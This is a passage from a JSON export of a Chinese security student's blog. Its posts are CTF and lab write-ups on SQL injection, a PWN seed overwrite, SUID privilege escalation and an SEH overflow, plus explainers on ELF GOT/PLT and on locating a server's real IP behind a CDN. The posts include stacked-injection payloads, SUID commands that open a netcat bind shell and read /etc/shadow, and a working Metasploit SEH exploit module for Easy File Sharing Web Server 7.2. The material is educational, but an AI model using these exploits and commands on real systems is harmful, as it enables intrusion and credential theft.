{"meta":{"title":"0pt1mus","subtitle":"不温不火，不急不躁，了解hows背后的whys","description":"文化水平不够可以读，为人处世不同可以学，钱没有可以赚，唯独你的内心必须坚定，你要不断努力，并且相信你自己绝对是一个有价值，值得被尊重和喜欢的人。","author":"0pt1mus","url":"https://superj.site","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"03/09/2020","updated":"10/01/2020","comments":false,"path":"/404.html","permalink":"https://superj.site/404.html","excerpt":"","text":""},{"title":"分类","date":"15/02/2020","updated":"15/02/2020","comments":true,"path":"categories/index.html","permalink":"https://superj.site/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"03/09/2020","updated":"10/01/2020","comments":false,"path":"about/index.html","permalink":"https://superj.site/about/index.html","excerpt":"","text":"文化水平不够可以读，为人处世不同可以学，钱没有可以赚，唯独你的内心必须坚定，你要不断努力，并且相信你自己绝对是一个有价值，值得被尊重和喜欢的人。 123456789101112131415161718192021222324&#123; name: &#x27;常江&#x27; age: 23, gender: &#x27;男&#x27;, profession: &#x27;学生 &amp; 网络安全 &amp; 渗透&#x27;, address: &#x27;山西省太原&#x27;, education: &#x27;研究生&#x27;, github: &#x27;https://github.com/overoptimus&#x27;, blog: &#x27;http://superj.site&#x27;, email: &#x27;1040570917@qq.com&#x27;, description: &#x27;热爱是一切的基础&#x27;, skills: [ [&#x27;Python&#x27;, &#x27;C&#x27;, &#x27;java&#x27;], [&#x27;CTF&#x27;, &#x27;Pwn&#x27;, &#x27;Reverse&#x27;, &#x27;Web&#x27;], [&#x27;OD&#x27;, &#x27;IDA&#x27;, &#x27;kali&#x27;] ], devTools: [ [&#x27;Sublime Text&#x27;, &#x27;Visual Studio Code&#x27;, &#x27;Atom&#x27;], [&#x27;Chrome&#x27;, &#x27;Wireshark&#x27;], [&#x27;SourceTree&#x27;], ] &#125;"},{"title":"Repositories","date":"03/09/2020","updated":"10/01/2020","comments":false,"path":"repository/index.html","permalink":"https://superj.site/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"28/01/2021","updated":"16/02/2020","comments":true,"path":"link/index.html","permalink":"https://superj.site/link/index.html","excerpt":"","text":""},{"title":"标签","date":"15/02/2020","updated":"15/02/2020","comments":true,"path":"tags/index.html","permalink":"https://superj.site/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"wp-攻防世界WEB-web2","date":"22/03/2021","path":"2021/03/22/20210322223617/","text":"这是一道简单的解密题，首先放上题目源码。 12345678910111213141516171819202122&lt;?php$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;function encode($str)&#123; $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; &#125; return str_rot13(strrev(base64_encode($_)));&#125;highlight_file(__FILE__);/* 逆向加密算法，解密$miwen就是flag*/?&gt; 分析得该题目就是有一个简单的加密算法和一些php函数组成。 0x00 php相关函数strrev — 反转字符串说明strrev ( string $string ) : string 返回 string 反转后的字符串。 参数 string 待反转的原始字符串。 返回值返回反转后的字符串。 范例123&lt;?phpecho strrev(&quot;Hello world!&quot;); // 输出 &quot;!dlrow olleH&quot;?&gt; str_rot13str_rot13 — 对字符串执行 ROT13 转换 说明str_rot13 ( string $str ) : string 对 str 参数执行 ROT13 编码并将结果字符串返回。 ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。 参数 str 输入字符串。 返回值返回给定字符串的 ROT13 版本。 范例12345&lt;?phpecho str_rot13(&#x27;PHP 4.3.0&#x27;); // CUC 4.3.0?&gt; base64_encodebase64_encode — 使用 MIME base64 对数据进行编码 说明base64_encode ( string $data ) : string 使用 base64 对 data 进行编码。 设计此种编码是为了使二进制数据可以通过非纯 8-bit 的传输层传输，例如电子邮件的主体。 Base64-encoded 数据要比原始数据多占用 33% 左右的空间。 参数 data 要编码的数据。 返回值编码后的字符串数据， 或者在失败时返回 **FALSE**。 范例1234&lt;?php$str = &#x27;This is an encoded string&#x27;;echo base64_encode($str);?&gt; 以上例程会输出： 1VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw&#x3D;&#x3D; 0x01 分析知晓涉及到的每个函数之后，就需要分析for循环做了些什么然后反向执行进行解密。 附上代码： 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;?php$miwen&#x3D;&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;$min &#x3D; str_rot13($miwen);$min &#x3D; strrev($min);$min &#x3D; base64_decode($min);for($_0&#x3D;0;$_0&lt;strlen($min);$_0++)&#123; $_c&#x3D;substr($min, $_0, 1); $__&#x3D;ord($_c)-1; $_c&#x3D;chr($__); $_&#x3D;$_.$_c;&#125;echo strrev($_);?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 0x02 mac环境php配置mac自带apache和php环境，只需要打开即可。 123sudo apachectl start # 开启apache服务sudo apachectl restart # 重启apache服务sudo apachectl stop # 停止apache服务 apache配置文件路径：/private/etc/apache2/httpd.conf。通过字符串寻找php位置，取消php模块前的注释。 apache网站服务根目录如下，可直接使用该目录，或自定义。"},{"title":"schtasks /query显示错误：无法加载列资源","date":"26/01/2021","path":"2021/01/26/20210126212422/","text":"操作系统：win 7 该原因是编码的不支持，通过chcp查看编码，936会导致无法加载列资源，修改为437即可。 1chcp 437 原因分析：刚开始认为就是因为编码的问题，不支持中文的编码，但是之后在win server 2012 r2上进行操作时，查看编码号也是936，所以应该不是编码的问题，可能就是在win7上出现的问题。"},{"title":"wp-攻防世界WEB-supersqli","date":"08/07/2020","path":"2020/07/08/20200708203725/","text":"首先先判断注入类型。可以通过输入一些字符串，在判断是否存在注入的同时判断注入类型。 123?inject=1-0?inject=1 \\?inject=1&#x27; 测试发现在输入1&#39;和1 \\时会出现报错信息。 发现该位置是一个字符型的注入。因此构造注入语句判断该注入有几个注入位置。 1?inject=1&#x27; order by x %23 这里的%23是#的url编码，因为#在url中代表这锚点，有自己的意义，一次要编码。也可使用--+、--%20等。 当x为3时报错，因此之后两列。 1?inject=1&#x27; union select 1,2 执行后发现，正则会过滤select等关键字符串。 在尝试内嵌注释语句打算绕过过滤后，发现无用，尝试堆叠注入。 1?inject=1&#x27;;show tables %23 执行后，得到表名。 分别查看两个表中的内容。 12?inject=1&#x27;;show columns from words; %23?inject=1&#x27;;show columns from `1919810931114514`; %23 表名是数字或者是其他特殊点的字符组成的要用``来包住，表名中间的是表名、数据库名、字段名。 可以看到在1919810931114514中有flag字段。现在就需要拿到flag字段中的值。select关键字被过滤。我们可以通过预编译来绕过。 1?inject=1&#x27;;set @sql = concat(&#x27;sel&#x27;,&#x27;ect flag from `1919810931114514`&#x27;);prepare stmt from @sql;execute stmt; %23 发现通过strstr过滤了set和prepare，但是这个函数区分大小写，所以通过大小写绕过。 1?inject=1&#x27;;sEt @sql = concat(&#x27;sel&#x27;,&#x27;ect flag from `1919810931114514`&#x27;);prepAre stmt from @sql;execute stmt; %23 得到flag：flag{c168d583ed0d4d7196967b28cbd0b5e9}。 总结通过这道题目，首先知道了#为什么在注入的时候达不到预期的情况，然后知道了堆叠注入的姿势，在常规的注入不成功的时候，可以考虑一下这种注入方式。最后也掌握了通过预编译的方式，通过concat函数绕过关键字符串的限制，同时，也了解strstr函数时区分大小写的。"},{"title":"Linux SUID/SGID介绍及利用","date":"12/06/2020","path":"2020/06/12/20200612172425/","text":"0x00 Linux文件属性通过ls -l我们可以查看各个文件的访问权限。 我们可以观察上方的这几个例子。 刚开始的第一位表示的是该文件的类型，有p、d、l、s、c、b和-。 符号 含义 p 表示命名管道文件 d 表示目录 l 表示符号链接文件 - 表示普通文件 s 表示socket文件 c 表示字符设备文件 b 表示块设备文件 之后的每三位分别表示文件所有者的权限、同组用户的权限、其他用户的权限。 符号 含义 w 写 r 读 x 执行 之后的数字表示硬链接的个数，然后就是文件所有者，所在组，再然后是文件的大小，和最新的更改时间，最后是文件名。 1drwxr-xr-x 11 optimus staff 352 2 18 12:01 tools 如上，这是一个目录，所有者optimus的权限为读写执行权限（这里的执行权限为搜索位，表示可以读写该目录的文件），所在组为staff，同组用户权限为读执行，其他用户的权限为读权限，有11个硬链接，大小为352，最新更新时间为2月18日12：01，文件名是tools。 0x01 SUID与SGID如果我们设置了SUID或SGID，那么所有者权限或同组权限的可执行位置就变为了s（区分大小写）。 属性 含义 -rwsr-xr-x 表示SUID和所有者权限中可执行位被设置 -rwSr–r– 表示SUID被设置，但所有者权限中可执行位没有被设置 -rwxr-sr-x 表示SGID和同组用户权限中可执行位被设置 -rw-r-Sr– 表示SGID被设置，但同组用户权限中可执行位没有被设置 一个文件的权限，是由12位二进制位来表示的，第11位为SUID位，第10位为SGID位，第9位为sticky位，第8-0位对应于上面的三组rwx位。 1-rwxr-xr-x 11 optimus staff 352 2 18 12:01 myfile 以上面为例，任何用户都可以执行这个程序。UNIX的内核是根据什么来确定一个进程对资源的访问权限的呢？是这个进程的运行用户的（有效）ID，包括user id和group id。用户可以用id命令来查到自己的或其他用户的user id和group id。 除了一般的user id 和group id外，还有两个称之为effective 的id，就是有效id，上面的四个id表示为：uid，gid，euid，egid。内核主要是根据euid和egid来确定进程对资源的访问权限。 一个进程如果没有SUID或SGID位，则euid=uid egid=gid，分别是运行这个程序的用户的uid和gid。例如jeffrey用户的uid和gid分别为204和202，optimus用户的uid和gid为200，201，jeffrey运行myfile程序形成的进程的euid=uid=204，egid=gid=202，内核根据这些值来判断进程对资源访问的限制，其实就是jeffrey用户对资源访问的权限，和optimus没关系。 如果一个程序设置了SUID，则euid和egid变成被运行的程序的所有者的uid和gid，例如jeffrey用户运行myfile，euid=200，egid=201，uid=204，gid=202，则这个进程具有它的属主optimus的资源访问权限。 SUID的作用就是这样：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。passwd就是一个很鲜明的例子。 0x02 利用可利用的命令有nmap、vim、find、bash、more、less、nano、cp。 查找开启SUID的命令123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; nmap利用nmap版本小于5.21时，可打开交互模式。 12nmap —interactivenmap&gt;!sh 也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。 1exploit/unix/local/setuid_nmap 在这个脚本中有一段注释。 1Note that modern interpreters will refuse to run scripts on the command line when EUID !&#x3D; UID, so the cmd&#x2F;unix&#x2F;reverse_&#123;perl,ruby&#125; payloads will most likely not work. 这段注释的翻译为 1注意，当EUID !&#x3D; UID时，现代解释器将拒绝在命令行上运行脚本，因此cmd&#x2F;unix&#x2F;reverse_&#123;perl,ruby&#125;负载很可能无法工作。 find利用123find existFile -exec whoami \\;find existFile -exec nc -lvp 4444 -e /bin/sh \\;find existFile -exec cat /etc/shadow \\; 其中第二个命令在实践时发现打开的命令行任然是普通用户的权限。 可以看到这时的uid和euid的值都为1000。因此这种方式现在可能会失效。但是其他方式还是可以的。"},{"title":"攻击windows异常处理机制SEH","date":"22/05/2020","path":"2020/05/22/20200522211303/","text":"0x00 简介本文主要有两个部分。第一部分介绍windows异常处理机制中的SEH，详细介绍SEH的工作原理。第二部分介绍如何通过栈溢出实现利用SEH来绕过GS。 0x01 SEH（异常处理结构体）SEH的全称是Structure Exception Handler，翻译为异常处理结构体，它是Windows异常处理机制所采用的的重要数据结构。每个SEH结构体包含两个DWORD指针：SEH链表指针和异常处理函数句柄，共八个字节。如下图： 对SEH的初步理解，我们要了解一下几点： S.E.H结构体存放在系统栈中。 当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的异常处理。 如果程序源代码中使用了__try&#123;&#125;__except&#123;&#125;或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H来实现异常处理。 栈中一般会同时存在多个S.E.H。 栈中的多个S.E.H通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的S.E.H通过T.E.B（线程环境块）0字节偏移处的指针标识，FS寄存器指向TEB的位置。 当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。 当离“事故现场”最近的异常处理函数运行失败时，将顺着S.E.H链表依次尝试其他的异常处理函数。 如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。 大概了解SEH的工作原理后，发现以下问题： S.E.H存放在栈内，故溢出缓冲区的数据有可能淹没S.E.H。 精心制造的溢出数据可以把S.E.H中异常处理函数的入口地址更改为shellcode的起始地址。 溢出后错误的栈帧或堆块数据往往会触发异常。 当Windows开始处理溢出后的异常时，会错误地把shellcode当做异常处理函数而执行。 这样，就可以绕过GS这种栈的保护机制，不通过溢出到返回地址，而是溢出修改SEH结构的异常处理函数的句柄，从而实现攻击。 注：异常处理机制和堆分配机制一样，会检测进程是否处于调试状态。异常处理在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。 0x02 详解SEH工作中的栈空间上面我们简单介绍了Windows在处理异常时的工作流程，但是我们如果要利用SEH来达到攻击的目的，则还需要知道在异常处理的时候的栈空间的状态。 在程序运行过程中，当触发了异常，程序尝试处理异常的时候，首先系统会执行异常的回调函数。 123456 EXCEPTION_DISPOSITION__cdecl _except_handler( struct _EXCEPTION_RECORD *ExceptionRecord, void * EstablisherFrame, struct _CONTEXT *ContextRecord, void * DispatcherContext); 并在栈中压入一个EXCEPTION_DISPOSITION Handler结构，如下图。 这个时候，esp指向栈顶位置就是这个结构体。这个结构体中包含这从TEB中得到的第一个SEH结构体的位置。这个时候，通过Establisher Frame找到第一个SEH结构体的位置，执行异常处理函数。 注：这一块栈空间的变化可以参考逆向与破解-windows异常处理机制 0x03 利用SEH我们知道了SEH的工作原理和执行时的栈空间的变化，接下来我们学习如何利用栈溢出，达到利用SEH进行攻击的方法。 基本步骤： 首先要得到溢出点到SEH结构体的偏移量。 然后要得到shellcode的起始位置。 触发异常。 以上步骤是最基本的，在真实的环境中我们还需要考虑其他因素。比如，在第二步中，理论上我们将SEH的后4个字节修改成shellcode的起始地址就可以了，但是如果开启了地址随机化，我们的shellcode的地址就无法准确的找到。所以一般是找未开启SafeSEH保护的pop/pop/ret的代码段，通过这个代码段跳转到shellcode中。为什么要利用PPR代码段，看下面。 0x04 为什么需要PPR来利用SEH我们分析上面那张栈空间的图可以发现，当触发异常时，此时的esp指向的是EXCEPTION_DISPOSITION Handler，当执行异常处理函数，PPR时，esp向高地址移动8个字节，指向了Establisher Frame，存着第一个SEH的地址，因此执行ret会将eip指向SEH，此时如果SEH的前两个字节为EB06，则会执行jmp指令，向下跳转6个字节，如果下面是一堆nop跟着shellcode，则会顺利滑进shellcode，成功执行。 0x05 实践实验环境：windows xp、kali 实验软件：Easy File Sharing Web Server 7.2、Immunity Debugger 实验步骤： 首先先生成一段用于溢出的字符串。 这里用到的工具是kali下msf自带的一个生成脚本pattern_create.rb。 1msf-pattern_create -l 10000 &gt; 1.txt xp上打开Easy File Sharing Web Server 7.2，并启动服务。用Immunity Debugger调试器attach到EFSWS的进程上，并点击run，使程序运行中。 通过脚本将字符串发给xp的80端口。 1234567891011121314151617181920import socketimport sys host = str(sys.argv[1])port = int(sys.argv[2]) a = socket.socket() print &quot;Connecting to: &quot; + host + &quot;:&quot; + str(port)a.connect((host,port)) # 这里是上一步生成的1.txt文件的内容buff = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2...&quot; a.send(&quot;HEAD &quot; + buff + &quot; HTTP/1.0\\r\\n\\r\\n&quot;) a.close() print &quot;Done...&quot; 打开Immunity Debugger的SEH chain，可发现如下图所示。 这里面显示的当前的SEH的handler为0x46356646，指向的下一个SEH的地址为0x34664633。因此，我们溢出字符串覆盖的SEH结构体的值为0x3466463346356646。 查找0x34664633在溢出字符串中的偏移量。这里为什么是前4个字节，因为pattern_offset工具找的是四个字节在pattern中的偏移位置，所以我们只需要知道SEH结构体的前四个字节中的值对应的偏移。 1msf-pattern_offset -q 34664633 执行后，获得偏移量。 通过Immunity Debugger的mona插件，寻找该程序中可以利用的dll模块。 1!mona modules 找到其中未开启SafeSEH的可利用模块，这里选择第一个ImageLoad.dll，并通过msfbinscan找其中的PPR。 写exp，并将脚本放入msf的exploit的目录下，以让msf能够找到攻击脚本。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748require &#x27;msf/core&#x27;class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::Tcp include Msf::Exploit::Seh def initialize(info = &#123;&#125;) super(update_info(info, &#x27;Name&#x27; =&gt; &#x27;Easy File Sharing HTTP Server 7.2 SEH Overflow&#x27;, &#x27;Description&#x27; =&gt; %q&#123; This Module Demonstrate SEH based overflow example &#125;, &#x27;Author&#x27; =&gt; &#x27;yanhan&#x27;, &#x27;Payload&#x27; =&gt; &#123; &#x27;Space&#x27; =&gt; 390, &#x27;BadChars&#x27; =&gt; &quot;\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e&quot; &#125;, &#x27;Platform&#x27; =&gt; &#x27;Windows&#x27;, &#x27;Targets&#x27; =&gt; [ [ &#x27;Easy File Sharing 7.2 HTTP&#x27;, &#123; &#x27;Ret&#x27; =&gt; 0x100188fc, &#x27;Offset&#x27; =&gt; 4061 &#125; ] ], &#x27;DisclosureDate&#x27; =&gt; &#x27;2019-01-16&#x27;, )) end def exploit connect weapon = &quot;HEAD &quot; weapon &lt;&lt; make_nops(target[&#x27;Offset&#x27;]) weapon &lt;&lt; generate_seh_record(target[&#x27;Ret&#x27;]) weapon &lt;&lt; make_nops(20) weapon &lt;&lt; payload.encoded weapon &lt;&lt; &quot; HTTP/1.0\\r\\n\\r\\n&quot; sock.put(weapon) handler disconnect endend 在脚本中Ret值是我们找到的PPR的地址，Offset是我们找到的溢出点。 msf中运行攻击脚本获得目标xp的meterpreter。 参考自杨老师SEH异常处理机制的栈溢出攻击及shell提取。 0x06 总结成功之后，思考通过mona找到了很多的dll，其中也有别的没有开SafeSEH，是不是也可以加以利用。实践发现在系统dll文件msasn1.dll中的0x76218422也有PPR可以利用。"},{"title":"elf文件的GOT和PLT","date":"06/05/2020","path":"2020/05/06/20200506120302/","text":"0x00 写在开始首先，我是从PE文件开始学习的，之后接触到了Linux下的ELF文件，在本质上来说，无论是Windows下的PE文件，还是Linux下的elf文件，他们本质上都是一个可执行文件，所运行的平台不同，它们的文件格式也有不同，但究其本质，还是会有互通的地方。 0x01 基础知识首先，elf文件也是由众多的节构成的，可以通过objdump -h查看。 下面解释.got、.plt、.got.plt三个节。 .gotGOT(Global Offset Table)全局偏移表。这是链接器为外部符号填充的实际偏移表。 .got Section中存放外部全局变量的GOT表，例如stdin/stdout/stderr，非延迟绑定 .pltPLT(Procedure Linkage Table)程序链接表。作用是一个跳板，保存了某个符号在重定位表中的偏移量(用来第一次查找某个符号)和对应的.got.plt的对应的地址。它有两个功能，要么在.got.plt节中拿到地址，并跳转。要么当.got.plt没有所需地址的时候，触发链接器去找到所需的地址。 .got.plt这个是GOT专门为PLT准备的节。保存了重定位地址。.got.plt中的值是GOT的一部分。它包含上述PLT表所需地址(已经找到的和需要去触发的)。 .got.plt Section中存放外部函数的GOT表，例如printf，采用延迟绑定 实例比如printf是一个重定位符号，需要链接该符号时过程是这样： main函数call .plt段中的一个地址，这里的第一句话就是跳转到.got.plt中的保存的printf的地址，如果是第一次，那么保存的地址就是.plt中的下一句话，这个下一句话就是压入这个符号在.rel.plt中的重定位表的偏移量，然后ld程序就会根据重定位表中的信息加上这个偏移量找到这个地址，保存到重定位表所指向的地址中，这个地址其实就是.got.plt段的一个地址。 第二次调用时就可以直接获取到.got.plt中保存的地址了。 0x02 实践接下来我们来实践一下，加深对这几个节的认识。 首先要有一个分析的程序，我们用一个helloworld。 1234567891011//gcc -m32 -no-pie -g -o helloworld_li helloworld.c//-g 产生有调试符号的程序#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char const *argv[])&#123; puts(&quot;Hello World!\\n&quot;); return 0;&#125; 用gdb打开该文件，开始分析： 首先反汇编main 找到call puts的地址，用b *0x804844b下断点，r执行到断点处并通过si单步步入。 我们可以看到当前指令是jmp跳转指令，跳转到0x804a00c。 我们之前通过objdump查看该文件的各个节，发现0x804a00c是在.got.plt中。 我们使用x/wx 0x804a00c查看这个位置的值。 发现该地址存着的信息是当前执行指令的下一个位置。所以执行jmp [0x804a00c]后会到0x80482e6的位置。 这里就可以理解，在第一次执行时，plt在.got.plt中没找到puts函数的地址，然后触发链接器去寻找puts函数的地址。 通过finish执行完当前函数，然后再查看0x804a00c位置的内容。 可以发现该位置的值已经变了，该地值便是puts函数的地址。 0x03 总结主要是在学习rop的时候，中间提到了return to libc，通过调用系统函数，而不是shellcode来实现打开shell。有一种方法是return to PLT，因为之前学习的是windows下的，对这个PLT很陌生，因此查资料学习了一下。windows下和linux下，有很多共通的地方，比如说这里的.plt和.got.plt同windows下的PE文件输入表中的INT和IAT很像。 参考链接：https://www.jianshu.com/p/5092d6d5caa3"},{"title":"(wp)攻防世界PWN——guess_num","date":"02/04/2020","path":"2020/04/02/20200402213448/","text":"好久没有做PWN题了，今天开始做一下，把之前的东西捡起来，同时对之前有些知识点也有了新的认识，新的理解。 分析首先将附件下载下来，同时通过nc连接一下，了解一下大致的流程。 可以看到，先让我们输入用户名，然后输入猜的的数字。 然后常规操作，通过file和checksec工具判断文件类型和开启了那些防护措施。 可以知道这是一个64位的linux程序，并且开启了部分只读，栈溢出保护，不可执行和地址随机化。 接着我们通过IDA加载，反汇编一下。 IDA加载程序后，ctrl+F5查看一下伪代码。 我们点击进入sub_C3E()，发现它会调用系统函数，打印flag，因此我们要保证程序能执行到这一步。 因此，在v4和v6比较时我们要保证这两个值相同，其中v4是我们的输入值，v6是随机数。我们知道这里的随机数是通过种子seed来形成的，如果seed一定，那么生成的随机数也是一定的。 双击seed[0]，可以发现seed是在栈帧中的，上面还有var_30。 查看汇编代码。 在代码中可以找到如下信息： 12345678910var_30 &#x3D; byte ptr -30hseed &#x3D; dword ptr -10hlea rax, [rbp+var_30]mov rdi, raxmov eax, 0call _getsmov rax, qword ptr [rbp+seed]mov edi, eax ; seedcall _srand 我们输入的name，存在栈帧中，占20h，下面高地址位紧跟着seed的值。因此我们可以溢出覆盖掉seed，将种子设置为已知值，从而控制生成的随机数。 写出exp： 12345678910111213141516from pwn import *from ctypes import *libc = cdll.LoadLibrary(&#x27;/bin/x86_64-linux-gnu/libc.so.6&#x27;)libc.srand(1)payload = &#x27;A&#x27; * 0x20 + p64(1).decode()r = remote(&#x27;111.198.29.45&#x27;, 57255)r.recvuntil(&#x27;name:&#x27;)r.sendline(payload)for i in range(10): num = str(libc.rand() % 6 + 1) io.recvuntil(&#x27;number:&#x27;) io.sendline(num)io.interactive() 其中so文件的路径是通过ldd工具找到的。 在这里，如果我们的开发环境不是在linux下，比如我是在MAC下，那么我们怎么去获得这个so文件呐。 既然没有，那我们是不是可以自己写一个呐，说干就干。 1234567891011#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void srand1()&#123; srand(1);&#125;int rand1()&#123; return rand();&#125; 然后通过gcc编译成一个so文件。 1gcc -fPIC -shared g_rand.c -o g_rand.so 然后我们在exp中，将文件的路径改为我们生成的so文件，调用变为我们自己的函数，也可以实现。 1234567891011121314151617from pwn import *from ctypes import *libc = cdll.LoadLibrary(&#x27;./g_rand.so&#x27;)libc.srand1()payload = &#x27;A&#x27; * 0x20 + p64(1).decode()r = remote(&#x27;111.198.29.45&#x27;, 57255)r.recvuntil(&#x27;name:&#x27;)r.sendline(payload)for i in range(10): num = str(libc.rand1() % 6 + 1) io.recvuntil(&#x27;number:&#x27;) io.sendline(num)io.interactive()"},{"title":"(wp)攻防世界MISC功夫再高也怕菜刀","date":"01/04/2020","path":"2020/04/01/20200401231442/","text":"攻防世界MISC类新手题的最后一道题，感觉思路啥的有些绕，不过用到的知识点还是很多的，记录一下。 这个wp参考网上大佬文章，自己是真的想不出来这种骚操作，还是太菜。 分析首先将附件下载下来，发现是一个.pcapng，是wireshark抓包后保存的文件。我们通过wireshark打来。 可以发现抓取的包中协议类型有TCP、HTTP、ARP，我们可以确定这是一个网页的请求。 我们通过搜索关键字flag，可以找到几个有flag关键字的包，逐个查看其TCP流，可以找到几个上传的包，在编号为1150的包的TCP流中，我们可以在其中找到已FFD8开头，FFD9结尾的十六进制串，这里是个知识点，这种开头结尾的十六进制串，是一个图片，我们将其复制出来，通过010Editor新建一个空文件，以十六进制文本粘贴，保存成一个.jpg文件。 打开，发现是一个字符串。 将其填入flag，发现不是flag。因此我们又要想了，这个字符串到底是用在哪里呐。 我们通过binwalk，发现其中还有一个zip文件。 通过foremost，分解出隐藏的文件。 打开分离出的压缩文件要求输入密码，填入Th1s_1s_p4sswd_!!!，得到flag文件。 总结这道题中的工具都知道，但是就是没有想到，还是做得题太少，脑子动的太少，归根到底，还是太菜。遇到问题一定要多尝试，把知道的方法都是一遍，总会有成功的时候，再不成功那就是知识面有短缺了，然后网上找一下大佬的wp，多学习。"},{"title":"绕过CDN获取真实IP","date":"29/03/2020","path":"2020/03/29/20200329102119/","text":"CDN介绍CDN（Content Delivery Network，即内容分发网络)。CDN是构建在现有网络基础之上的只能虚拟网络，依靠部署在各地的边缘服务器，通过中心的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。 域名解析过程传统访问：用户访问域名-&gt;解析IP-&gt;访问目标主机 套用CDN后：用户访问域名-&gt;CDN节点-&gt;真实IP-&gt;目标主机 目前有部分的CDN服务商也提供了WAF的功能，对一些恶意的流量进行拦截。 CND检测方法全球ping通过全球各个地方对目标网站进行ping，观察返回的IP地址手否相同，若每个地区的IP地址不相同，则说明存在CDN。 利用网站：http://ping.chinaz.com/ nslookup通过nslookup工具来判断是否有使用CDN。 若套用了CDN的话，和baidu.com的结果类似，在非权威回到中有多个解答；若没有套用CDN的话，和superj.site的结果类似，在非权威回答中只有一个解答。 绕过CDN找真实IP通过子域找真实IP通常使用CDN服务会产生服务费用，网站管理员一般只会给重要的业务和主站使用CDN，而访问较少和不重要的业务不会使用CDN，而且一般情况下，主站和子站会在一个服务器上，因此可以通过子域名来找真实IP。 收集子域名的方法：12345678# google hacker语法site:baidu.com# 在线工具https:&#x2F;&#x2F;phpinfo.me&#x2F;domain&#x2F;http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;https:&#x2F;&#x2F;securitytrails.com&#x2F;https:&#x2F;&#x2F;dnsdb.io&#x2F;zh-cn&#x2F; 通过历史DNS记录找真实IP查找DNS的解析记录，在没使用CDN之前，DNS解析的是网站的真实IP。 可以使用如下网站进行查询： 123https:&#x2F;&#x2F;x.threatbook.cn&#x2F;https:&#x2F;&#x2F;ipchaxun.com&#x2F;https:&#x2F;&#x2F;viewdns.info&#x2F;iphistory&#x2F; 通过邮箱找真实IP我们在访问目标网站的时候，会先去找CDN，但是如果网站主动和客户端通信的话，不会使用CDN，那么我们看到的源地址就是目标网站的真实IP。 那么什么时候网站会主动和客户通信呢？我们在注册用户、修改密码、找回密码时，服务器会给用户发送邮件，若此时邮件服务器和网站服务器在一起，那么我们就可以获取到网站的真实IP。若两者不在一起，那么绑定IP地址后，可能会造成无法访问目标网站。 ![image-20200329121007955](/Users/optimus/Library/Application Support/typora-user-images/image-20200329121007955.png) 这里的地址是一个ipv6的地址。 通过探针找真实IP如果可以在网站上发现phpinfo.php等文件时，我们可以通过phpinfo()等方法获得真实IP。 在phpinfo()返回的信息中，SERVER_NAME参数中反悔了真实的IP地址。 通过网站漏洞找真实IP网站若发现存在XSS、命令执行、上传文件、文件包含等漏洞，我们可以直接通过上传探针文件，执行命令来获取网站的真实IP。 通过网络空间引擎搜索找真实IP123https:&#x2F;&#x2F;fofa.so&#x2F;https:&#x2F;&#x2F;www.zoomeye.org&#x2F;dochttps:&#x2F;&#x2F;www.shodan.io&#x2F; 只需要输入：title:&quot;网站的title关键字&quot;或者body:&quot;网站的body特征&quot;就可以找出这些引擎收录的有这些关键字的ip域名，很多时候都可以获得网站的真实IP。"},{"title":"(wp)buuctf杂项达芬奇密码","date":"26/03/2020","path":"2020/03/26/20200326003719/","text":"buuctf是一个收录了各个比赛的题目的靶场，真的是什么题都有，各种脑洞，稀奇古怪的加密编码类型，甚至还有什么中文电码之类的稀奇古怪。 大家有兴趣可以去刷刷，很棒的刷题地方。 解题思路首先这道题题目是达芬奇密码，百度之后发现这是一部电影，当时也没想的去看一下电影的简介什么的，后面加buuctf关键字，也没有找到相应的wp。果断google，找到大佬的wp，发现在电影简介中会提到——斐波那契数列。 11 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309 对比蒙娜丽莎中的数字列，发现数值一样，但是进行了位移。 之后对比，题目中给到的两个数列的长度都是32，并且flag也是32位，可以推测，神秘数列是通过flag位移后得出的，而位移的规则是斐波那契数列的位移。 12345671 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 